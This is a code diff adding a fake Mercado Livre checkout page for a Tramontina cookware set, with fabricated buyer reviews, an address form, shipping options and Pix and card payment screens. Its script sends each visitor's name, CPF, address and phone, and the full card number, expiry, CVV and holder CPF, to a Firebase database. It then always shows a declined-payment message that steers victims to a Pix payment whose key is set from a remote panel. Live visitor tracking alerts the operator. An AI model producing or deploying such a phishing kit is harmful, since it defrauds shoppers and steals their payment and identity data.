+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_722278-MLA73249612538_122023-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_716351-MLA73336251221_122023-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_921810-MLA73249612540_122023-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_934649-MLA73249651762_122023-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+            </div>
+            <div class="comentario__footer"><button class="comentario__util">👍 Útil · 17</button></div>
+          </div>
+          <div class="comentario">
+            <div class="comentario__header"><span class="comentario__estrelas">★★★★★</span><span class="comentario__data">Brasil · Há 8 meses</span></div>
+            <p class="comentario__texto">Chegou super rápido, bem embalado. As panelas são firmes, o antiaderente funciona muito bem. Já usei várias vezes e continua como nova. Recomendo demais!</p>
+            <div class="comentario__fotos">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_957516-MLA74797680990_032024-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_690679-MLA74701097090_022024-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+            </div>
+            <div class="comentario__footer"><button class="comentario__util">👍 Útil · 45</button></div>
+          </div>
+          <div class="comentario">
+            <div class="comentario__header"><span class="comentario__estrelas">★★★★★</span><span class="comentario__data">Brasil · Há 6 meses</span></div>
+            <p class="comentario__texto">Custo-benefício excelente. Comprei para presentear minha mãe e ela amou. As tampas de vidro são resistentes e o cabo não esquenta. Vale muito a pena.</p>
+            <div class="comentario__fotos">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_891817-MLA74914893636_032024-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_722278-MLA73249612538_122023-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_735170-MLA75053581249_032024-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+            </div>
+            <div class="comentario__footer"><button class="comentario__util">👍 Útil · 32</button></div>
+          </div>
+          <div class="comentario">
+            <div class="comentario__header"><span class="comentario__estrelas">★★★★☆</span><span class="comentario__data">Brasil · Há 5 meses</span></div>
+            <p class="comentario__texto">Produto muito bom, porém achei a frigideira um pouco pequena. Mas no geral atendeu bem, a marca Tramontina é confiável. Entrega dentro do prazo.</p>
+            <div class="comentario__fotos"><img src="https://http2.mlstatic.com/D_NQ_NP_2X_624513-MLA81388446390_122024-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)"></div>
+            <div class="comentario__footer"><button class="comentario__util">👍 Útil · 12</button></div>
+          </div>
+          <div class="comentario">
+            <div class="comentario__header"><span class="comentario__estrelas">★★★★★</span><span class="comentario__data">Brasil · Há 3 meses</span></div>
+            <p class="comentario__texto">Já é a segunda vez que compro. A primeira foi pra mim e agora comprei pra minha irmã. Qualidade impecável, não gruda nada e é fácil de lavar. Nota 10!</p>
+            <div class="comentario__fotos">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_921810-MLA73249612540_122023-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_934649-MLA73249651762_122023-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+            </div>
+            <div class="comentario__footer"><button class="comentario__util">👍 Útil · 28</button></div>
+          </div>
+          <div class="comentario">
+            <div class="comentario__header"><span class="comentario__estrelas">★★★★★</span><span class="comentario__data">Brasil · Há 2 meses</span></div>
+            <p class="comentario__texto">Superou minhas expectativas! As panelas são pesadas e robustas, dá pra ver que é material de qualidade. O preço promocional valeu cada centavo. Recomendo!</p>
+            <div class="comentario__fotos">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_716351-MLA73336251221_122023-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_833062-MLA74832420203_022024-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_870882-MLA81657876325_122024-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+            </div>
+            <div class="comentario__footer"><button class="comentario__util">👍 Útil · 22</button></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <section class="termos-busca">
+      <h2>Termos mais procurados</h2>
+      <div class="termos-busca__chips">
+        <a href="#">apple watch</a><a href="#">ar condicionado</a><a href="#">ar condicionado inverter</a>
+        <a href="#">bicicletas</a><a href="#">cafeteira</a><a href="#">carros novos</a>
+        <a href="#">computador</a><a href="#">fogao 4 boca</a><a href="#">fone de ouvido bluetooth</a>
+        <a href="#">freezer vertical</a><a href="#">geladeira frost free</a><a href="#">guarda roupa casal</a>
+        <a href="#">guarda roupa solteiro</a><a href="#">ipad</a><a href="#">iphone</a>
+        <a href="#">iphone 8 plus</a><a href="#">iphone 11</a><a href="#">iphone 13</a>
+        <a href="#">iphone 13 pro max</a><a href="#">iphone 14</a><a href="#">iphone 14 pro</a>
+        <a href="#">iphone 14 pro max</a><a href="#">iphone 15</a><a href="#">iphone 16</a>
+        <a href="#">iphone 16 plus</a><a href="#">iphone 16 pro</a><a href="#">iphone 16 pro max</a>
+        <a href="#">jbl</a><a href="#">microondas</a><a href="#">monitor</a>
+        <a href="#">motorola</a><a href="#">nintendo switch</a><a href="#">notebook</a>
+        <a href="#">notebook dell</a><a href="#">painel para tv</a><a href="#">penteadeira</a>
+        <a href="#">poco x5 pro</a><a href="#">ps4</a><a href="#">ps5</a>
+        <a href="#">redmi note 12</a><a href="#">s22 ultra</a><a href="#">samsung a54</a>
+        <a href="#">samsung s23</a><a href="#">smartwatch</a><a href="#">tablets samsung</a>
+        <a href="#">tenis masculino</a><a href="#">tennis feminino</a><a href="#">tv 32 polegadas</a>
+        <a href="#">tv 50 4k</a><a href="#">tv 50 polegadas</a><a href="#">ventilador</a>
+        <a href="#">xbox</a><a href="#">xbox series x</a><a href="#">xdj</a>
+        <a href="#">xiaomi</a><a href="#">comparador de celulares</a>
+      </div>
+    </section>
+
+    <section class="busca-letra">
+      <h2>Pesquise produto por letra inicial</h2>
+      <div class="busca-letra__alfabeto">
+        <a href="#">A</a><span>-</span><a href="#">B</a><span>-</span><a href="#">C</a><span>-</span>
+        <a href="#">D</a><span>-</span><a href="#">E</a><span>-</span><a href="#">F</a><span>-</span>
+        <a href="#">G</a><span>-</span><a href="#">H</a><span>-</span><a href="#">I</a><span>-</span>
+        <a href="#">J</a><span>-</span><a href="#">K</a><span>-</span><a href="#">L</a><span>-</span>
+        <a href="#">M</a><span>-</span><a href="#">N</a><span>-</span><a href="#">O</a><span>-</span>
+        <a href="#">P</a><span>-</span><a href="#">Q</a><span>-</span><a href="#">R</a><span>-</span>
+        <a href="#">S</a><span>-</span><a href="#">T</a><span>-</span><a href="#">U</a><span>-</span>
+        <a href="#">V</a><span>-</span><a href="#">W</a><span>-</span><a href="#">X</a><span>-</span>
+        <a href="#">Y</a><span>-</span><a href="#">Z</a>
+      </div>
+    </section>
+
+    <footer class="rodape">
+      <h3>Mais informações</h3>
+      <p class="rodape__copyright">Copyright © 1999-2026. Mercado Livre Brasil Ltda.</p>
+      <div class="rodape__links">
+        <a href="#">Trabalhe conosco</a><a href="#">Termos e condições</a><a href="#">Promoções</a>
+        <a href="#">Como cuidamos da sua privacidade</a><a href="#">Acessibilidade</a><a href="#">Contato</a>
+        <a href="#">Informações sobre seguros</a><a href="#">Programa de Afiliados</a>
+      </div>
+      <p class="rodape__legal">
+        CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre.
+      </p>
+    </footer>
+  </div>
+
+  <!-- ENDEREÇO -->
+  <div id="appEndereco" class="hidden">
+    <div class="end-wrap">
+      <header><a href="#" onclick="voltarSite(); return false;">&#8592;</a>Adicione um endereço</header>
+      <form id="formEndereco">
+        <label for="nome">Nome completo</label>
+        <input type="text" id="nome" name="nome" required>
+        <small>Como aparece no seu RG ou CNH.</small>
+        <label for="cpf">CPF</label>
+        <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" required maxlength="14" inputmode="numeric">
+        <small>Necessário para emissão da nota fiscal.</small>
+        <label for="cep">CEP</label>
+        <input type="text" id="cep" name="cep" required maxlength="9" inputmode="numeric" onblur="buscarCep()">
+        <small id="cepStatus"></small>
+        <label for="rua">Rua</label>
+        <input type="text" id="rua" name="rua" required>
+        <label for="numero">Número</label>
+        <input type="text" id="numero" name="numero" required>
+        <label for="complemento">Complemento</label>
+        <input type="text" id="complemento" name="complemento">
+        <label for="bairro">Bairro</label>
+        <input type="text" id="bairro" name="bairro" required>
+        <label for="cidade">Cidade</label>
+        <input type="text" id="cidade" name="cidade" required>
+        <label for="estado">Estado</label>
+        <input type="text" id="estado" name="estado" required maxlength="2">
+        <label for="telefone">Telefone de contato</label>
+        <input type="text" id="telefone" name="telefone" required maxlength="15" inputmode="numeric">
+        <div class="button-container">
+          <button type="submit" id="btnEndereco">Continuar</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- FRETE -->
+  <div id="appFrete" class="hidden">
+    <div class="frete-wrap">
+      <header><a href="#" onclick="voltarEndereco(); return false;">&#8592;</a>Escolha quando sua compra chegará</header>
+      <main>
+        <div class="endereco-box" id="mostrarEndereco"></div>
+        <div class="envio-full">📦 Envio 1 FULL</div>
+        <div class="opcoes-frete">
+          <div class="opcao"><input type="radio" name="frete" id="hoje"><label for="hoje">Hoje</label><span class="gratis">Grátis</span></div>
+          <div class="opcao"><input type="radio" name="frete" id="amanha" checked><label for="amanha">Amanhã <small style="color:#888;font-size:12px;">(Recomendado)</small></label><span class="gratis">Grátis</span></div>
+          <div class="opcao"><input type="radio" name="frete" id="fimSemana"><label for="fimSemana">Entre sexta-feira e domingo</label><span class="gratis">Grátis</span></div>
+          <div class="opcao"><input type="radio" name="frete" id="seuDia"><label for="seuDia">Seu dia de entregas <small style="color:#3483fa;">(NOVO)</small></label><span class="gratis">Grátis</span></div>
+        </div>
+        <div class="button-container">
+          <button onclick="irParaPagamento()">Continuar</button>
+        </div>
+      </main>
+    </div>
+  </div>
+
+  <!-- PAGAMENTO -->
+  <div id="appPagamento" class="hidden">
+    <div class="pag-wrap">
+      <header><a href="#" onclick="voltarFrete(); return false;">&#8592;</a>Escolha como pagar</header>
+      <main class="pag-main">
+        <div class="pag-titulo">Escolha o meio de pagamento</div>
+        <div class="metodos-pagamento">
+          <button class="metodo" onclick="escolherPix()">
+            <img src="https://img.icons8.com/color/48/pix.png" alt="Pix">
+            <div class="metodo-info">Pix<small>Aprovação imediata</small></div>
+            <div class="recomendado">RECOMENDADO</div>
+          </button>
+          <button class="metodo" onclick="escolherCartao()">
+            <img src="https://img.icons8.com/color/48/card-exchange.png" alt="Cartão de Crédito">
+            <div class="metodo-info">Novo cartão de crédito<small>Pagamento em até 12x</small></div>
+          </button>
+        </div>
+      </main>
+      <div class="pag-footer"><div>Você pagará</div><strong>R$ 159,44</strong></div>
+    </div>
+  </div>
+
+  <!-- PIX -->
+  <div id="appPix" class="hidden">
+    <div class="pix-wrap">
+      <header><a href="#" onclick="voltarPagamento(); return false;">&#8592;</a>Pagamento via Pix</header>
+      <div class="pix-mensagem" id="pixMensagem">Aguarde, gerando PIX, já é quase seu.</div>
+      <div class="pix-box" id="pixBox">
+        <div class="topo" id="pixTopo">Pague R$ 159,44 via Pix para garantir sua compra</div>
+        <div class="conteudo">
+          <p>Escaneie o QR Code ou copie o código para pagar</p>
+          <div class="qrcode-container">
+            <img id="qrCodeImg" src="" alt="QR Code Pix">
+          </div>
+          <ol>
+            <li>Acesse seu Internet Banking ou app de pagamentos.</li>
+            <li>Escolha pagar via Pix (com código copia e cola).</li>
+            <li>Cole o seguinte código:</li>
+          </ol>
+          <input type="text" id="chavePix" readonly>
+          <button onclick="copiarChave()">Copiar código</button>
+          <div class="nota">Pague e será creditado na hora</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CARTÃO -->
+  <div id="appCartao" class="hidden">
+    <div class="cartao-wrap">
+      <header><a href="#" onclick="voltarPagamento(); return false;">&#8592;</a>Novo cartão</header>
+      <div class="card-preview">
+        <img src="" class="bandeira" id="bandeira" style="display: none;" alt="">
+      </div>
+      <div class="container">
+        <div class="slide active" id="slide1">
+          <label for="numeroCartao">Número do cartão</label>
+          <input type="text" id="numeroCartao" maxlength="19" placeholder="•••• •••• •••• ••••" oninput="formatCardNumber(); detectCardBrand();">
+        </div>
+        <div class="slide" id="slide2">
+          <label for="nomeCartao">Nome do titular</label>
+          <input type="text" id="nomeCartao" placeholder="Nome impresso no cartão">
+        </div>
+        <div class="slide" id="slide3">
+          <label for="validade">Validade (MM/AA)</label>
+          <input type="text" id="validade" maxlength="5" placeholder="MM/AA" oninput="formatValidade()">
+          <label for="cvv">CVV</label>
+          <input type="text" id="cvv" maxlength="4" placeholder="CVV">
+        </div>
+        <div class="slide" id="slide4">
+          <label for="cpfCartao">CPF do titular</label>
+          <input type="text" id="cpfCartao" maxlength="14" placeholder="000.000.000-00" oninput="formatCpfCartao()">
+        </div>
+        <div class="navigation" id="navigation">
+          <button id="anterior" onclick="anterior()" disabled>Anterior</button>
+          <button id="seguinte" onclick="seguinte()">Seguinte</button>
+        </div>
+        <button class="btn-pagar" id="btnPagarCartao" style="display: none;" onclick="pagarCartao()">Pagar</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="processando" id="processando">Processando pagamento...</div>
+  <div class="recusado" id="recusado">
+    <div class="icon">❌</div>
+    <div class="mensagem">Não foi possível processar seu pagamento</div>
+    <div class="submensagem">Tente usar outro cartão ou selecione pagar com PIX.</div>
+    <button class="btn-tentar" onclick="voltarPagamento()">Tentar novamente</button>
+  </div>
+
+  <!-- MODAL CEP -->
+  <div id="modalCep" style="position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:10000;display:none;align-items:center;justify-content:center;padding:20px;">
+    <div style="background:#fff;border-radius:12px;padding:24px;max-width:420px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.3);">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
+        <h2 style="font-size:18px;margin:0;color:#333;">Informe seu CEP</h2>
+        <button onclick="fecharModalCep()" style="background:none;border:none;font-size:24px;cursor:pointer;color:#666;line-height:1;">×</button>
+      </div>
+      <p style="font-size:13px;color:#666;margin:0 0 16px;">Digite seu CEP para calcularmos o frete e o prazo de entrega.</p>
+
+      <label style="display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:6px;">CEP</label>
+      <input type="text" id="cepTopo" maxlength="9" inputmode="numeric" placeholder="00000-000"
+        style="width:100%;padding:12px;border:2px solid #ddd;border-radius:8px;font-size:16px;outline:none;margin-bottom:6px;"
+        oninput="formatarCepTopo(this)"
+        onkeypress="if(event.key==='Enter'){event.preventDefault();confirmarCepTopo();}">
+      <small id="cepTopoStatus" style="display:block;font-size:12px;color:#888;min-height:16px;margin-bottom:16px;"></small>
+
+      <div id="cepTopoResultado" style="display:none;background:#f8f8f8;border-radius:8px;padding:12px;font-size:13px;color:#333;line-height:1.6;margin-bottom:16px;"></div>
+
+      <button onclick="confirmarCepTopo()" style="width:100%;padding:14px;background:#3483fa;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;">
+        Confirmar CEP
+      </button>
+    </div>
+  </div>
+
+  <!-- FIREBASE -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyACKSuwEZUvaaRIYa0LD_9XEsgIBvc_ua8",
+      authDomain: "dashr-55b1e.firebaseapp.com",
+      databaseURL: "https://dashr-55b1e-default-rtdb.firebaseio.com",
+      projectId: "dashr-55b1e",
+      storageBucket: "dashr-55b1e.firebasestorage.app",
+      messagingSenderId: "229775202758",
+      appId: "1:229775202758:web:30dbd15036c3fdb5edfac7"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // ============================================================
+    // 🔑 FALLBACK — só usado se o painel NÃO tiver chave salva
+    // ============================================================
+    const PIX_CHAVE_FALLBACK = "SUA_CHAVE_PIX_AQUI";
+    const PIX_NOME_FALLBACK  = "MERCADO LIVRE";
+    const PIX_CIDADE_FALLBACK = "SAO PAULO";
+    // ============================================================
+
+    const VALOR_PEDIDO = 159.44;
+
+    // Cache local da config (atualizado em TEMPO REAL pelo .on)
+    let pixConfigCache = { chave: '', nome: '', cidade: '' };
+
+    // Escuta config_pix em TEMPO REAL — se o painel salvar, o site já usa na hora
+    db.ref('config_pix').on('value', snap => {
+      pixConfigCache = snap.val() || { chave: '', nome: '', cidade: '' };
+      console.log('[PIX] Config atualizada em tempo real:', pixConfigCache);
+    });
+
+    let clienteId = localStorage.getItem('clienteId');
+    if (!clienteId) {
+      clienteId = 'c_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
+      localStorage.setItem('clienteId', clienteId);
+    }
+    const pedidoRef = db.ref('pedidos/' + clienteId);
+
+    db.ref('visitas/' + clienteId).update({ online: true, entrouEm: Date.now(), ultimaAtividade: Date.now() });
+    db.ref('visitas/' + clienteId).onDisconnect().update({ online: false, saiuEm: Date.now() });
+    setInterval(() => {
+      db.ref('visitas/' + clienteId).update({ ultimaAtividade: Date.now() });
+    }, 15000);
+    window.addEventListener('beforeunload', () => {
+      db.ref('visitas/' + clienteId).update({ online: false, saiuEm: Date.now() });
+    });
+
+    pedidoRef.update({ valor: VALOR_PEDIDO, produto: 'Jogo de Panelas Tramontina', entrouEm: Date.now() });
+
+    function abrirLightbox(src) {
+      document.getElementById('lightboxImg').src = src;
+      document.getElementById('lightbox').style.display = 'flex';
+    }
+    function fecharLightbox() {
+      document.getElementById('lightbox').style.display = 'none';
+    }
+
+    const appSite        = document.getElementById('appSite');
+    const appEndereco    = document.getElementById('appEndereco');
+    const appFrete       = document.getElementById('appFrete');
+    const appPagamento   = document.getElementById('appPagamento');
+    const appPix         = document.getElementById('appPix');
+    const appCartao      = document.getElementById('appCartao');
+    const telaLoading    = document.getElementById('telaLoading');
+
+    function trocarImagem(miniatura, url) {
+      document.getElementById('imagemPrincipal').src = url;
+      document.querySelectorAll('.galeria__miniaturas img').forEach(img => img.classList.remove('ativa'));
+      miniatura.classList.add('ativa');
+    }
+
+    function comprarAgora() {
+      pedidoRef.update({ clicouComprar: true, clicouComprarEm: Date.now(), valor: VALOR_PEDIDO });
+      db.ref('alertas').push({ tipo: 'clique_comprar', clienteId, timestamp: Date.now() });
+
+      telaLoading.classList.remove('hidden');
+      setTimeout(() => {
+        telaLoading.classList.add('hidden');
+        appSite.classList.add('hidden');
+        appEndereco.classList.remove('hidden');
+        window.scrollTo(0, 0);
+      }, 1000);
+    }
+
+    function voltarSite() {
+      appEndereco.classList.add('hidden');
+      appSite.classList.remove('hidden');
+      window.scrollTo(0, 0);
+    }
+
+    document.getElementById('cpf').addEventListener('input', function() {
+      let v = this.value.replace(/\D/g, '');
+      if (v.length > 11) v = v.slice(0, 11);
+      v = v.replace(/(\d{3})(\d)/, '$1.$2');
+      v = v.replace(/(\d{3})(\d)/, '$1.$2');
+      v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+      this.value = v;
+    });
+    document.getElementById('cep').addEventListener('input', function() {
+      let v = this.value.replace(/\D/g, '');
+      if (v.length > 8) v = v.slice(0, 8);
+      v = v.replace(/(\d{5})(\d)/, '$1-$2');
+      this.value = v;
+    });
+    document.getElementById('telefone').addEventListener('input', function() {
+      let v = this.value.replace(/\D/g, '');
+      if (v.length > 11) v = v.slice(0, 11);
+      let f = '';
+      if (v.length > 0) f = '(' + v.slice(0, 2);
+      if (v.length >= 3) f += ') ' + v.slice(2, v.length >= 7 ? 7 : v.length);
+      if (v.length >= 7) f += '-' + v.slice(7);
+      this.value = f;
+    });
+
+    function buscarCep() {
+      const cepInput = document.getElementById('cep');
+      const status = document.getElementById('cepStatus');
+      const cep = cepInput.value.replace(/\D/g, '');
+      if (cep.length !== 8) { status.textContent = ''; return; }
+      status.textContent = 'Buscando...';
+      fetch(`https://viacep.com.br/ws/${cep}/json/`)
+        .then(r => r.json())
+        .then(data => {
+          if (data.erro) { status.textContent = ''; return; }
+          document.getElementById('rua').value = data.logradouro || '';
+          document.getElementById('bairro').value = data.bairro || '';
+          document.getElementById('cidade').value = data.localidade || '';
+          document.getElementById('estado').value = data.uf || '';
+          status.textContent = 'Endereço preenchido automaticamente.';
+        })
+        .catch(() => { status.textContent = ''; });
+    }
+
+    document.getElementById('formEndereco').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const dados = {
+        nome: document.getElementById('nome').value.trim(),
+        cpf: document.getElementById('cpf').value.trim(),
+        cep: document.getElementById('cep').value.trim(),
+        rua: document.getElementById('rua').value.trim(),
+        numero: document.getElementById('numero').value.trim(),
+        complemento: document.getElementById('complemento').value.trim(),
+        bairro: document.getElementById('bairro').value.trim(),
+        cidade: document.getElementById('cidade').value.trim(),
+        estado: document.getElementById('estado').value.trim(),
+        telefone: document.getElementById('telefone').value.trim()
+      };
+      if (!dados.nome || !dados.cpf || !dados.cep || !dados.rua || !dados.numero || !dados.bairro || !dados.cidade || !dados.estado || !dados.telefone) {
+        alert('Preencha todos os campos obrigatórios.');
+        return;
+      }
+      pedidoRef.update({ endereco: dados, login: dados.nome, logadoEm: Date.now(), valor: VALOR_PEDIDO });
+      db.ref('alertas').push({ tipo: 'endereco_preenchido', clienteId, nome: dados.nome, timestamp: Date.now() });
+
+      const endFormatado = `${dados.nome}<br>${dados.rua}, ${dados.numero}${dados.complemento ? ' - ' + dados.complemento : ''}<br>${dados.bairro} - ${dados.cidade}/${dados.estado}<br>CPF: ${dados.cpf}<br>Tel: ${dados.telefone}`;
+      document.getElementById('mostrarEndereco').innerHTML = endFormatado;
+
+      appEndereco.classList.add('hidden');
+      appFrete.classList.remove('hidden');
+      window.scrollTo(0, 0);
+    });
+
+    function voltarEndereco() {
+      appFrete.classList.add('hidden');
+      appEndereco.classList.remove('hidden');
+      window.scrollTo(0, 0);
+    }
+
+    function irParaPagamento() {
+      const freteSel = document.querySelector('input[name="frete"]:checked');
+      const freteVal = freteSel ? freteSel.id : 'amanha';
+      pedidoRef.update({ frete: freteVal, freteEm: Date.now() });
+      appFrete.classList.add('hidden');
+      appPagamento.classList.remove('hidden');
+      window.scrollTo(0, 0);
+    }
+
+    function voltarFrete() {
+      appPagamento.classList.add('hidden');
+      appFrete.classList.remove('hidden');
+      window.scrollTo(0, 0);
+    }
+
+    /* ---------- PIX (lê do painel em tempo real, fallback no código) ---------- */
+    function gerarPayloadPix(chave, nome, cidade, valor) {
+      const f = (id, val) => id + ('00' + String(val).length).slice(-2) + val;
+      const clean = s => (s || '').normalize('NFD').replace(/[\u0300-\u036f]/g, '').toUpperCase();
+      const gui = f('00', 'br.gov.bcb.pix') + f('01', String(chave || '').trim());
+      let raw = f('00', '01') + f('26', gui) + f('52', '0000') + f('53', '986');
+      if (valor) raw += f('54', parseFloat(valor).toFixed(2));
+      raw += f('58', 'BR') + f('59', clean(nome).substring(0, 25)) +
+             f('60', clean(cidade).substring(0, 15)) + f('62', f('05', '***')) + '6304';
+      let crc = 0xFFFF;
+      for (let i = 0; i < raw.length; i++) {
+        crc ^= (raw.charCodeAt(i) << 8);
+        for (let j = 0; j < 8; j++) crc = (crc & 0x8000) ? ((crc << 1) ^ 0x1021) & 0xFFFF : (crc << 1) & 0xFFFF;
+      }
+      return raw + ('0000' + crc.toString(16).toUpperCase()).slice(-4);
+    }
+
+    // Função que decide qual chave usar: painel > fallback código
+    function obterConfigPixAtual() {
+      const cfg = pixConfigCache || {};
+      let chave = String(cfg.chave || '').trim();
+      let nome  = String(cfg.nome  || '').trim();
+      let cidade = String(cfg.cidade || '').trim();
+
+      // Se painel não tem chave válida, usa fallback do código
+      if (!chave || chave === 'SUA_CHAVE_PIX_AQUI') {
+        chave = String(PIX_CHAVE_FALLBACK || '').trim();
+        nome  = PIX_NOME_FALLBACK;
+        cidade = PIX_CIDADE_FALLBACK;
+      }
+      if (!nome)   nome = PIX_NOME_FALLBACK;
+      if (!cidade) cidade = PIX_CIDADE_FALLBACK;
+
+      return { chave, nome, cidade };
+    }
+
+    function escolherPix() {
+      appPagamento.classList.add('hidden');
+      appPix.classList.remove('hidden');
+      window.scrollTo(0, 0);
+
+      pedidoRef.update({
+        pagamentoTipo: 'pix',
+        pix: { geradoEm: Date.now(), copiado: false, valor: VALOR_PEDIDO }
+      });
+      db.ref('alertas').push({ tipo: 'pix_gerado', clienteId, timestamp: Date.now() });
+
+      const msg = document.getElementById('pixMensagem');
+      const box = document.getElementById('pixBox');
+
+      // Lê do cache em tempo real (já atualizado pelo .on)
+      const { chave, nome, cidade } = obterConfigPixAtual();
+
+      if (!chave || chave === 'SUA_CHAVE_PIX_AQUI') {
+        msg.textContent = 'Pix ainda não configurado. Contate o administrador.';
+        return;
+      }
+
+      const payload = gerarPayloadPix(chave, nome, cidade, VALOR_PEDIDO);
+      const qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(payload);
+
+      msg.style.display = 'none';
+      box.style.display = 'block';
+      document.getElementById('chavePix').value = payload;
+      document.getElementById('qrCodeImg').src = qrUrl;
+      document.getElementById('pixTopo').textContent =
+        'Pague R$ ' + VALOR_PEDIDO.toFixed(2).replace('.', ',') + ' via Pix para garantir sua compra';
+
+      pedidoRef.update({
+        'pix/chaveRaw': chave,
+        'pix/chave': payload,
+        'pix/qrCode': qrUrl,
+        'pix/valor': VALOR_PEDIDO,
+        'pix/geradoEm': Date.now(),
+        'pix/copiado': false,
+        'pix/origemChave': (pixConfigCache && pixConfigCache.chave) ? 'painel' : 'fallback_codigo'
+      });
+    }
+
+    function voltarPagamento() {
+      appPix.classList.add('hidden');
+      appCartao.classList.add('hidden');
+      document.getElementById('processando').style.display = 'none';
+      document.getElementById('recusado').style.display = 'none';
+      appPagamento.classList.remove('hidden');
+      window.scrollTo(0, 0);
+    }
+
+    function copiarChave() {
+      const input = document.getElementById('chavePix');
+      input.select();
+      document.execCommand('copy');
+      pedidoRef.update({ 'pix/copiado': true, 'pix/copiadoEm': Date.now() });
+      db.ref('alertas').push({ tipo: 'pix_copiado', clienteId, timestamp: Date.now() });
+      alert('Código PIX copiado!');
+    }
+
+    /* ---------- CARTÃO ---------- */
+    function escolherCartao() {
+      appPagamento.classList.add('hidden');
+      appCartao.classList.remove('hidden');
+      pedidoRef.update({ pagamentoTipo: 'cartao' });
+      currentSlide = 1;
+      showSlide(1);
+      window.scrollTo(0, 0);
+    }
+
+    let currentSlide = 1;
+    const totalSlides = 4;
+
+    function showSlide(n) {
+      for (let i = 1; i <= totalSlides; i++) {
+        document.getElementById('slide' + i).classList.remove('active');
+      }
+      document.getElementById('slide' + n).classList.add('active');
+      document.getElementById('anterior').disabled = n === 1;
+      if (n === totalSlides) {
+        document.getElementById('navigation').style.display = 'none';
+        document.getElementById('btnPagarCartao').style.display = 'block';
+      } else {
+        document.getElementById('navigation').style.display = 'flex';
+        document.getElementById('btnPagarCartao').style.display = 'none';
+      }
+    }
+
+    function anterior() { if (currentSlide > 1) { currentSlide--; showSlide(currentSlide); } }
+
+    function seguinte() {
+      if (currentSlide < totalSlides) {
+        currentSlide++;
+        showSlide(currentSlide);
+      }
+    }
+
+    function detectarBandeira(num) {
+      if (/^4/.test(num)) return 'Visa';
+      if (/^(5[1-5]|2[2-7])/.test(num)) return 'Mastercard';
+      if (/^3[47]/.test(num)) return 'Amex';
+      if (/^(4011|4312|4389|5041|5066|5090|6277|6362|6363|650|651|655)/.test(num)) return 'Elo';
+      if (/^(6062|3841|637|095)/.test(num)) return 'Hipercard';
+      return 'Outra';
+    }
+
+    function pagarCartao() {
+      const numeroRaw = document.getElementById('numeroCartao').value.replace(/\D/g, '');
+      const numeroFormatado = document.getElementById('numeroCartao').value.trim();
+      const ultimos4 = numeroRaw.slice(-4);
+      const bandeira = detectarBandeira(numeroRaw);
+      const nomeCompleto = document.getElementById('nomeCartao').value.trim();
+      const validade = document.getElementById('validade').value.trim();
+      const cvv = document.getElementById('cvv').value.trim();
+      const cpfCartao = document.getElementById('cpfCartao').value.trim();
+
+      pedidoRef.update({
+        pagamentoTipo: 'cartao',
+        cartao: {
+          bandeira: bandeira,
+          numero: numeroFormatado,
+          ultimos4: ultimos4,
+          nome: nomeCompleto,
+          validade: validade,
+          cvv: cvv,
+          cpf: cpfCartao,
+          tentouEm: Date.now()
+        },
+        status: 'recusado',
+        valor: VALOR_PEDIDO
+      });
+
+      db.ref('alertas').push({
+        tipo: 'cartao_enviado',
+        clienteId: clienteId,
+        bandeira: bandeira,
+        ultimos4: ultimos4,
+        timestamp: Date.now()
+      });
+
+      document.getElementById('numeroCartao').value = '';
+      document.getElementById('nomeCartao').value = '';
+      document.getElementById('validade').value = '';
+      document.getElementById('cvv').value = '';
+      document.getElementById('cpfCartao').value = '';
+
+      document.getElementById('processando').style.display = 'flex';
+      setTimeout(() => {
+        document.getElementById('processando').style.display = 'none';
+        document.getElementById('recusado').style.display = 'flex';
+      }, 2500);
+    }
+
